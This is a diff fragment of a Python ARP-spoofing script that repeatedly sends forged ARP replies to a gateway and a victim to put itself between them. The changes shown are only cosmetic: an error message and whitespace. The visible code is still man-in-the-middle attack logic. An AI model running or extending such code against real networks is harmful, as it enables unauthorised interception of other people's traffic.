@@ -36,7 +36,7 @@ def spoof_arp(target_ip, spoof_ip):
 
     target_mac = get_mac(target_ip)
     if target_mac is None:
-        print(f'[!] Could not get MAC address for {target_ip}. Exiting...')
+        print(f"[!] Could not get MAC address for {target_ip}.")
         return False
 
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
@@ -69,11 +69,11 @@ if __name__ == "__main__":
             success1 = spoof_arp(target_ip=gateway_ip, spoof_ip=victim_ip)
             success2 = spoof_arp(target_ip=victim_ip, spoof_ip=gateway_ip)
             sys.stdout.flush()
-            
+
             if not (success1 and success2):
                 print("[!] Some spoof packets failed to send due to MAC resolution failures.")
                 sys.exit(1)
-                
+
             time.sleep(2)
 
     except KeyboardInterrupt:
